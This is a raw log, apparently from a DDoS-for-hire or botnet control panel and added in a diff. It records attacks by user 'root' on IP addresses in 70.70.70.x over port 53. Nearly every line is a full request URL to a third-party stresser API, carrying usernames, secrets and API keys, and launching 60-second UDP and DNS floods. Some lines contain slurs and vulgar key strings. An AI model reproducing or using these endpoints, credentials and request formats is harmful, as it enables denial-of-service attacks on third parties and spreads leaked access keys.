+2024/12/10 16:41:39 [ATTACK] Error sending request to: http://proxy.blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns - Get "http://proxy.blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup proxy.blankc2.fun: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://theeyeapi.unhittable.gg/api/attack?username=star&key=strrfrgg010&host=70.70.70.59&port=53&time=60&method=udp - Get "https://theeyeapi.unhittable.gg/api/attack?username=star&key=strrfrgg010&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup theeyeapi.unhittable.gg: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:39 [ATTACK] Error sending request to: http://toxicipstresser.cloud:6969/api/attack?username=xdrop&secret=balls&host=70.70.70.59&port=60&time=60&method=udp - Get "http://toxicipstresser.cloud:6969/api/attack?username=xdrop&secret=balls&host=70.70.70.59&port=60&time=60&method=udp": dial tcp: lookup toxicipstresser.cloud: no such host
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://gorilla-api.su/api/attack?username=xdrop&secret=24xdrop23&host=70.70.70.59&port=53&time=60&method=dns - Get "https://gorilla-api.su/api/attack?username=xdrop&secret=24xdrop23&host=70.70.70.59&port=53&time=60&method=dns": dial tcp: lookup gorilla-api.su: no such host
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://mythicalstressapi.net/?key=j2ys2wydzbl2ir48elgojabv6rmjfs&host=70.70.70.59&port=53&time=60&method=UDPAU
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=changeme&host=70.70.70.59&port=53&time=60&method=udp - Get "https://theeyeapi.unhittable.gg/api/attack?username=fedworld&key=changeme&host=70.70.70.59&port=53&time=60&method=udp": dial tcp: lookup theeyeapi.unhittable.gg: getaddrinfow: Zazwyczaj jest przejściowy błąd występujący podczas rozpoznawania nazwy hosta; oznacza, że lokalny serwer nie otrzymał odpowiedzi od autorytatywnego serwera.
+2024/12/10 16:41:39 [ATTACK] Error sending request to: http://connect-synth.xyz:3000/api/101be105959fe620/attack?&target=70.70.70.59&port=53&time=60&method=udp_api - Get "http://connect-synth.xyz:3000/api/101be105959fe620/attack?&target=70.70.70.59&port=53&time=60&method=udp_api": dial tcp: lookup connect-synth.xyz: no such host
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://crtz.top/api/attack?username=tsukiapi&secret=wixkwn193jen&host=70.70.70.59&port=53&duration=60&method=UDP
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://insanesec.com/api/start?username=flcty&key=FEf6FfnlGsish2F&target=70.70.70.59&port=53&duration=60&method=UDP
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api-sona.xyz/api/attack?username=glock&secret=glock&host=70.70.70.59&port=53&time=60&method=udp-pps
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.59&port=53&time=60&method=gudp_api
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://1337.rest/api.php?api_key=2b852c3e2333f0448ba17c3df2ad18ca&target=70.70.70.59&time=60&port=53&method=UDP-BYPASS&concurrents=1
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://kraysecurity.com/api/api.php?key=0sUU6IW0ZAaUllWX&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://mythicalstressapi.net/?key=j2ys2wydzbl2ir48elgojabv6rmjfs&host=70.70.70.59&port=53&time=60&method=UDPRANDOM
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=u85y7r438t76g4389u6t8y943586&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://akitz.online/api/attack?username=fedworld&key=fedworld&host=70.70.70.59&port=53&time=60&method=gudp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.59&port=53&time=60&method=gudp_api
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=543u7yrf893wu65t3&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:39 [ATTACK] Sending request to: http://93.123.85.244/api/attack?key=nigga&host=70.70.70.59&port=53&time=60&method=udp-gbps
+2024/12/10 16:41:39 [ATTACK] Sending request to: http://toxic-c2.de:6969/api/attack?username=vse&secret=getfucked&host=70.70.70.59&port=53&time=60&method=UDP-VSE
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://miami-api.cc/api/attack?username=flcty&secret=RyXMfmrXu10s&target=70.70.70.59&port=53&duration=60&method=!UDP
+2024/12/10 16:41:39 [ATTACK] Sending request to: http://93.123.85.244/api/attack?username=begs&key=noballs&host=70.70.70.59&time=60&port=60&method=UDP-LONE
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://wrldsecurity.ru/api/attack?username=projectworld&secret=u85y7r438t76g4389u6t8y943586&host=70.70.70.59&port=53&time=60&method=UDP-PPS
+2024/12/10 16:41:39 [ATTACK] Sending request to: http://satanservices.xyz/api/attack?username=lixl&key=iPxrkan&host=70.70.70.59&port=53&time=60&method=gudp
+2024/12/10 16:41:39 [ATTACK] Sending request to: http://ddos.africa:8080/api/attack?username=moneky&password=monkey&target=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://hackar.stresser.rip/api/attack?username=stopbegs&key=stopbegs&host=70.70.70.59&port=53&time=60&method=udpbypass
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://hackar.stresser.rip/api/attack?username=stopbegs&key=stopbegs&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://glacier-api.xyz/api/attack?username=chefe&key=Cwel123&host=70.70.70.59&time=60&port=53&method=UDP-PPS
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api.vacstresser.ru/api?key=e87a0d23-f8c1-4525-bdef-c52425eb7e71&host=70.70.70.59&port=53&duration=60&method=UDPBYPASS
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api.leanc2.dev/api/attack?username=fedworld&key=7A8hgFeWq33&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api.arthurc2.xyz/api/attack?username=begs&secret=balls&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://overdose.sbs/api/attack?username=projectworld&key=projectworld121&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: http://85.192.56.228/api.php?key=milka&target=70.70.70.59&duration=60&method=gudp&method_type=udp&port=53
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://overdose.sbs/api/attack?username=begs&key=balls&host=70.70.70.59&port=53&time=60&method=udp-dose
+2024/12/10 16:41:39 [ATTACK] Sending request to: http://2.59.117.173:555/api/?key=stopbegs&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://kodachi.xyz/api/attack?username=api&key=api1234&host=70.70.70.59&port=53&time=60&method=gudp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api.colombia-c2.wtf/api/attack?username=project&secret=passwd&host=70.70.70.59&time=60&port=53&method=udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://glacier-api.xyz/api/attack?username=chefe&key=Cwel123&host=70.70.70.59&time=60&port=53&method=UDP-BYPASS
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=stopbegsapi&secret=sexybrofrngl&host=70.70.70.59&port=53&time=60&method=dns
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=stopbegsapi&secret=kieran&host=70.70.70.59&port=53&time=60&method=udpbypass
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://api.skibidi.sbs/api/attack?username=tonhocau&secret=change&host=70.70.70.59&port=53&time=60&method=dns - Get "https://api.skibidi.sbs/api/attack?username=tonhocau&secret=change&host=70.70.70.59&port=53&time=60&method=dns": stopped after 10 redirects
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api.inverse.sh?token=2DrvPtgCrvqT0x04XmSOsY&target={target}&port={port}&duration={duration}&method=UDP-SOURCE&concs=2
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://yuze-api.xyz/api/attack?username=x2u&secret=x2uisop$30&host=70.70.70.59&port=53&time=60&method=!udpplain
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=world&secret=123123&host=70.70.70.59&time=60&port=53&method=dns
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api.inverse.sh?token=ctKmcvX4aeZVXLF2O28uHx&host=70.70.70.59&port=53&time=60&method=UDP-SOURCE
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://yuze-api.xyz/api/attack?username=x2u&secret=x2uisop$30&host=70.70.70.59&port=53&time=60&method=!udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api.frosty.rip/rocky/api/v1/attack?license=saturnednigga&host=70.70.70.59&port=53&time=60&method=dns
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api.frosty.rip/kittybooter/api/v1/attack?license=saturnednigga&host=70.70.70.59&port=53&time=60&method=dns
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://aetherapi.com/api/attack?username=begs&secret=balls&host=70.70.70.59&port=53&time=60&method=api-udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&key=snowy&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&secret=snowy&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://crtz.top/api/attack?username=chefe&secret=chefeapi09&host=70.70.70.59&port=53&time=60&method=UDPDROP
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://akarui.fyi/api/attack?username=sins&key=sins@gg$$$&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://crtz.top/api/attack?username=chefe&secret=chefeapi09&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://wrldsecurity.net/api/attack?username=pathc2api&secret=643t5ge4336y3467y34&host=70.70.70.59&port=53&duration=60&method=UDP
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://akarui.fyi/api/attack?username=sins&key=sins@gg$$$&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: http://resemble.wtf:444/resembleapi?key=sis212sa2ass&target=70.70.70.59&port=53&time=60&method=udp-star
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api.eternalproxy.xyz/api/attack?username=stopbegs&secret=stopbegs&host=70.70.70.59&port=53&time=60&method=udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://api.kaitenc2.de/api/attack?username=josh&password=balls&target=70.70.70.59&port=53&duration=60&method=.udp
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://crucial-stress.us/api/start?user=stopbegs&key=stopbegs12345&target=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:39 [ATTACK] Sending request to: http://93.123.85.53/api.php?key=flshhhh&host=70.70.70.59&port=53&time=60&method=UDP
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://apisystem.herios-stress.xyz/api/attack?username=toring&key=tsukinetworks&host=70.70.70.59&port=53&duration=60&method=udpplain - Get "https://apisystem.herios-stress.xyz/api/attack?username=toring&key=tsukinetworks&host=70.70.70.59&port=53&duration=60&method=udpplain": tls: failed to verify certificate: x509: certificate signed by unknown authority
+2024/12/10 16:41:39 [ATTACK] Error sending request to: https://apisystem.herios-stress.xyz/api/attack?username=whosdior&key=changeme&host=70.70.70.59&port=53&time=60&method=dns - Get "https://apisystem.herios-stress.xyz/api/attack?username=whosdior&key=changeme&host=70.70.70.59&port=53&time=60&method=dns": tls: failed to verify certificate: x509: certificate signed by unknown authority
+2024/12/10 16:41:39 [ATTACK] Sending request to: https://apisystem.nguyenletriloc.pro/api/attack?username=securinq&secret=securinqapi4api&host=70.70.70.59&port=53&time=60&method=L4-pps
+2024/12/10 16:42:10 New Attack (API)!
+Username: root
+Target: 70.70.70.36
+Port: 53
+Time: 60
+Method: udp
+----------------------
+2024/12/10 16:42:10 [ATTACK] Error sending request to: https://homicide-api.lol/api/attack?username=IceyCody&secret=IceyCody&host=70.70.70.36&port=53&time=60&method=!udp - Get "https://homicide-api.lol/api/attack?username=IceyCody&secret=IceyCody&host=70.70.70.36&port=53&time=60&method=!udp": dial tcp: lookup homicide-api.lol: no such host
+2024/12/10 16:42:10 [ATTACK] Error sending request to: https://api.stdstresser.xyz/api/attack?username=wrykw810&secret=wrykw810&host=70.70.70.36&port=53&time=60&method=udp-dn - Get "https://api.stdstresser.xyz/api/attack?username=wrykw810&secret=wrykw810&host=70.70.70.36&port=53&time=60&method=udp-dn": dial tcp: lookup api.stdstresser.xyz: no such host
+2024/12/10 16:42:10 [ATTACK] Error sending request to: http://toxicipstresser.cloud:6969/api/attack?username=xdrop&secret=balls&host=70.70.70.36&port=60&time=60&method=udp - Get "http://toxicipstresser.cloud:6969/api/attack?username=xdrop&secret=balls&host=70.70.70.36&port=60&time=60&method=udp": dial tcp: lookup toxicipstresser.cloud: no such host
+2024/12/10 16:42:10 [ATTACK] Error sending request to: http://virusc2.xyz:6969/api/attack?username=heiken&secret=sigma123&host=70.70.70.36&port=53&time=60&method=.UDP-GBPS - Get "http://virusc2.xyz:6969/api/attack?username=heiken&secret=sigma123&host=70.70.70.36&port=53&time=60&method=.UDP-GBPS": dial tcp: lookup virusc2.xyz: no such host
+2024/12/10 16:42:10 [ATTACK] Error sending request to: http://virusc2.xyz:6969/api/attack?username=chefe&secret=123123&host=70.70.70.36&port=53&time=60&method=.UDP-GBPS - Get "http://virusc2.xyz:6969/api/attack?username=chefe&secret=123123&host=70.70.70.36&port=53&time=60&method=.UDP-GBPS": dial tcp: lookup virusc2.xyz: no such host
+2024/12/10 16:42:10 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.36&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.36&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:42:10 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?&key=ggbro420&host=70.70.70.36&port=53&time=60&method=udp-fun - Get "https://api.vortexa-services.xyz/api?&key=ggbro420&host=70.70.70.36&port=53&time=60&method=udp-fun": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:42:10 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.36&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=ggbro420&host=70.70.70.36&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:42:10 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.36&port=53&time=60&method=gudp-twat - Get "https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.36&port=53&time=60&method=gudp-twat": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:42:10 [ATTACK] Error sending request to: https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.36&port=53&time=60&method=udp-fun - Get "https://api.vortexa-services.xyz/api?key=poop&host=70.70.70.36&port=53&time=60&method=udp-fun": dial tcp: lookup api.vortexa-services.xyz: no such host
+2024/12/10 16:42:10 [ATTACK] Sending request to: https://1337.rest/api.php?api_key=2b852c3e2333f0448ba17c3df2ad18ca&target=70.70.70.36&time=60&port=53&method=UDP-BOOM&concurrents=1
+2024/12/10 16:42:10 [ATTACK] Error sending request to: https://brainc2.uk/api/api.php?key=projectwrld&host=70.70.70.36&port=53&time=60&method=udp - Get "https://brainc2.uk/api/api.php?key=projectwrld&host=70.70.70.36&port=53&time=60&method=udp": dial tcp: lookup brainc2.uk: no such host
+2024/12/10 16:42:10 [ATTACK] Sending request to: https://akitz.online/api/attack?username=fedworld&key=fedworld&host=70.70.70.36&port=53&time=60&method=gudp
+2024/12/10 16:42:10 [ATTACK] Sending request to: https://crtz.top/api/attack?username=tsukiapi&secret=wixkwn193jen&host=70.70.70.36&port=53&duration=60&method=UDP
+2024/12/10 16:42:10 [ATTACK] Sending request to: https://insanesec.com/api/start?username=flcty&key=FEf6FfnlGsish2F&target=70.70.70.36&port=53&duration=60&method=UDP
+2024/12/10 16:42:10 [ATTACK] Sending request to: https://api-sona.xyz/api/attack?username=glock&secret=glock&host=70.70.70.36&port=53&time=60&method=udp-pps
+2024/12/10 16:42:10 [ATTACK] Sending request to: https://1337.rest/api.php?api_key=2b852c3e2333f0448ba17c3df2ad18ca&target=70.70.70.36&time=60&port=53&method=UDP-BYPASS&concurrents=1
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://mythicalstressapi.net/?key=j2ys2wydzbl2ir48elgojabv6rmjfs&host=70.70.70.36&port=53&time=60&method=UDPAU
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.papernetwork.xyz/api/attack?username=flcty&key=MBenz300&target=70.70.70.36&port=53&duration=60&method=udp
+2024/12/10 16:42:11 [ATTACK] Sending request to: http://93.123.85.244/api/attack?key=nigga&host=70.70.70.36&port=53&time=60&method=udp-gbps
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.36&port=53&time=60&method=gudp_api
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.36&port=53&time=60&method=gudp_api
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.chryslervx.com/api/attack?username=saturnc2&password=saturnc2api&host=70.70.70.36&port=53&time=60&method=udp_api
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://kraysecurity.com/api/api.php?key=0sUU6IW0ZAaUllWX&host=70.70.70.36&port=53&time=60&method=UDP
+2024/12/10 16:42:11 [ATTACK] Sending request to: http://toxic-c2.de:6969/api/attack?username=vse&secret=getfucked&host=70.70.70.36&port=53&time=60&method=UDP-VSE
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=ggbro900&host=70.70.70.36&port=53&time=60&method=udp - Get "https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=ggbro900&host=70.70.70.36&port=53&time=60&method=udp": dial tcp: lookup chronos.awaken-proxy-api.xyz: no such host
+2024/12/10 16:42:11 [ATTACK] Error sending request to: http://hideaki-api.awaken-proxy-api.xyz:443/api/attack?username=begs&key=curry&host=70.70.70.36&port=53&time=60&method=gudp - Get "http://hideaki-api.awaken-proxy-api.xyz:443/api/attack?username=begs&key=curry&host=70.70.70.36&port=53&time=60&method=gudp": dial tcp: lookup hideaki-api.awaken-proxy-api.xyz: no such host
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=riley&host=70.70.70.36&port=53&time=60&method=udp - Get "https://chronos.awaken-proxy-api.xyz/api/attack?username=begs&key=riley&host=70.70.70.36&port=53&time=60&method=udp": dial tcp: lookup chronos.awaken-proxy-api.xyz: no such host
+2024/12/10 16:42:11 [ATTACK] Sending request to: http://93.123.85.244/api/attack?username=begs&key=noballs&host=70.70.70.36&time=60&port=60&method=UDP-LONE
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://ddos.srv.lat/attack?token=nGS4bDqVidKO4qGNvF2WWw&host&host=70.70.70.36&port=53&time=60&method=!udpv2&concs=1 - Get "https://ddos.srv.lat/attack?token=nGS4bDqVidKO4qGNvF2WWw&host&host=70.70.70.36&port=53&time=60&method=!udpv2&concs=1": dial tcp: lookup ddos.srv.lat: no such host
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://ddos.srv.lat/attack?token=MpuQPllkwUFzZ8elnu5fPU&host=70.70.70.36&port=53&time=60&method=out-udp&concs=1 - Get "https://ddos.srv.lat/attack?token=MpuQPllkwUFzZ8elnu5fPU&host=70.70.70.36&port=53&time=60&method=out-udp&concs=1": dial tcp: lookup ddos.srv.lat: no such host
+2024/12/10 16:42:11 [ATTACK] Error sending request to: http://connect-synth.xyz:3000/api/101be105959fe620/attack?&target=70.70.70.36&port=53&time=60&method=udp_api - Get "http://connect-synth.xyz:3000/api/101be105959fe620/attack?&target=70.70.70.36&port=53&time=60&method=udp_api": dial tcp: lookup connect-synth.xyz: no such host
+2024/12/10 16:42:11 [ATTACK] Sending request to: http://ddos.africa:8080/api/attack?username=moneky&password=monkey&target=70.70.70.36&port=53&time=60&method=udp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://hackar.stresser.rip/api/attack?username=stopbegs&key=stopbegs&host=70.70.70.36&port=53&time=60&method=udpbypass
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://mythicalstressapi.net/?key=j2ys2wydzbl2ir48elgojabv6rmjfs&host=70.70.70.36&port=53&time=60&method=UDPRANDOM
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://phantom.cool/api/attack?token={token}&host={host}&port={port}&time={time}&method=GUDP - Get "https://phantom.cool/api/attack?token={token}&host={host}&port={port}&time={time}&method=GUDP": dial tcp: lookup phantom.cool: no such host
+2024/12/10 16:42:11 [ATTACK] Sending request to: http://proxy.blanknetwork.fun:8080/api/attack?username=begs&password=123&target=70.70.70.36&port=53&time=60&method=dns
+2024/12/10 16:42:11 [ATTACK] Error sending request to: http://chronos.awaken-network.net:443/api/attack?username=toring&key=toring111&host=70.70.70.36&port=53&duration=60&method=UDP - Get "http://chronos.awaken-network.net:443/api/attack?username=toring&key=toring111&host=70.70.70.36&port=53&duration=60&method=UDP": dial tcp: lookup chronos.awaken-network.net: no such host
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.36&port=53&time=60&method=udpbypass - Get "https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.36&port=53&time=60&method=udpbypass": dial tcp: lookup api.autumn-network.xyz: no such host
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.36&port=53&time=60&method=pps - Get "https://api.autumn-network.xyz/api/attack?username=stopbegs&key=curry&host=70.70.70.36&port=53&time=60&method=pps": dial tcp: lookup api.autumn-network.xyz: no such host
+2024/12/10 16:42:11 [ATTACK] Sending request to: http://satanservices.xyz/api/attack?username=lixl&key=iPxrkan&host=70.70.70.36&port=53&time=60&method=gudp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://hackar.stresser.rip/api/attack?username=stopbegs&key=stopbegs&host=70.70.70.36&port=53&time=60&method=udp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://miami-api.cc/api/attack?username=flcty&secret=RyXMfmrXu10s&target=70.70.70.36&port=53&duration=60&method=!UDP
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://private.bartrickc2.ovh/api/attack?username=@stopbegs&secret=@stopbegs&host=70.70.70.36&port=53&time=60&method=l4-udp - Get "https://private.bartrickc2.ovh/api/attack?username=@stopbegs&secret=@stopbegs&host=70.70.70.36&port=53&time=60&method=l4-udp": dial tcp: lookup private.bartrickc2.ovh: no such host
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.leanc2.dev/api/attack?username=fedworld&key=7A8hgFeWq33&host=70.70.70.36&port=53&time=60&method=udp
+2024/12/10 16:42:11 [ATTACK] Error sending request to: http://blankc2.fun:8080/api/attack?username=fedworld&password=123&target=70.70.70.36&port=53&time=60&method=udp - Get "http://blankc2.fun:8080/api/attack?username=fedworld&password=123&target=70.70.70.36&port=53&time=60&method=udp": dial tcp: lookup blankc2.fun: no such host
+2024/12/10 16:42:11 [ATTACK] Error sending request to: http://blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.36&port=53&time=60&method=dns - Get "http://blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.36&port=53&time=60&method=dns": dial tcp: lookup blankc2.fun: no such host
+2024/12/10 16:42:11 [ATTACK] Error sending request to: http://proxy.blankc2.fun:6968/api/attack/api/attack?username=begs&password=rileyrowe420&target=70.70.70.36&port=53&time=60&method=dns - Get "http://proxy.blankc2.fun:6968/api/attack/api/attack?username=begs&password=rileyrowe420&target=70.70.70.36&port=53&time=60&method=dns": dial tcp: lookup proxy.blankc2.fun: no such host
+2024/12/10 16:42:11 [ATTACK] Error sending request to: http://proxy.blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.36&port=53&time=60&method=dns - Get "http://proxy.blankc2.fun:8888/api/attack?username=stopbegs&password=balls&target=70.70.70.36&port=53&time=60&method=dns": dial tcp: lookup proxy.blankc2.fun: no such host
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.36&port=53&time=60&method=mix2 - Get "https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.36&port=53&time=60&method=mix2": dial tcp: lookup c2.furry.ong: no such host
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.36&port=53&time=60&method=mix2 - Get "https://c2.furry.ong/api?key=iewvndociewnsociewnncpesw&host=70.70.70.36&port=53&time=60&method=mix2": dial tcp: lookup c2.furry.ong: no such host
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://overdose.sbs/api/attack?username=begs&key=balls&host=70.70.70.36&port=53&time=60&method=udp-dose
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://api.tsuki-solutions.cc/api/attack?username=securinq&key=balls&host=70.70.70.36&port=53&time=60&method=udp-vip - Get "https://api.tsuki-solutions.cc/api/attack?username=securinq&key=balls&host=70.70.70.36&port=53&time=60&method=udp-vip": dial tcp: lookup api.tsuki-solutions.cc: no such host
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://overdose.sbs/api/attack?username=projectworld&key=projectworld121&host=70.70.70.36&port=53&time=60&method=udp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://glacier-api.xyz/api/attack?username=chefe&key=Cwel123&host=70.70.70.36&time=60&port=53&method=UDP-PPS
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://gorilla-api.su/api/attack?username=xdrop&secret=24xdrop23&host=70.70.70.36&port=53&time=60&method=dns - Get "https://gorilla-api.su/api/attack?username=xdrop&secret=24xdrop23&host=70.70.70.36&port=53&time=60&method=dns": dial tcp: lookup gorilla-api.su: no such host
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://kodachi.xyz/api/attack?username=api&key=api1234&host=70.70.70.36&port=53&time=60&method=gudp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.vacstresser.ru/api?key=e87a0d23-f8c1-4525-bdef-c52425eb7e71&host=70.70.70.36&port=53&duration=60&method=UDPBYPASS
+2024/12/10 16:42:11 [ATTACK] Error sending request to: https://api.skibidi.sbs/api/attack?username=tonhocau&secret=change&host=70.70.70.36&port=53&time=60&method=dns - Get "https://api.skibidi.sbs/api/attack?username=tonhocau&secret=change&host=70.70.70.36&port=53&time=60&method=dns": stopped after 10 redirects
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://glacier-api.xyz/api/attack?username=chefe&key=Cwel123&host=70.70.70.36&time=60&port=53&method=UDP-BYPASS
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=stopbegsapi&secret=kieran&host=70.70.70.36&port=53&time=60&method=udpbypass
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=world&secret=123123&host=70.70.70.36&time=60&port=53&method=dns
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.arthurc2.xyz/api/attack?username=begs&secret=balls&host=70.70.70.36&port=53&time=60&method=udp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.inverse.sh?token=2DrvPtgCrvqT0x04XmSOsY&target={target}&port={port}&duration={duration}&method=UDP-SOURCE&concs=2
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://yuze-api.xyz/api/attack?username=x2u&secret=x2uisop$30&host=70.70.70.36&port=53&time=60&method=!udpplain
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.inverse.sh?token=ctKmcvX4aeZVXLF2O28uHx&host=70.70.70.36&port=53&time=60&method=UDP-SOURCE
+2024/12/10 16:42:11 [ATTACK] Sending request to: http://2.59.117.173:555/api/?key=stopbegs&host=70.70.70.36&port=53&time=60&method=udp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://api.colombia-c2.wtf/api/attack?username=project&secret=passwd&host=70.70.70.36&time=60&port=53&method=udp
+2024/12/10 16:42:11 [ATTACK] Sending request to: https://cypherservices.su/api/attack?username=stopbegsapi&secret=sexybrofrngl&host=70.70.70.36&port=53&time=60&method=dns
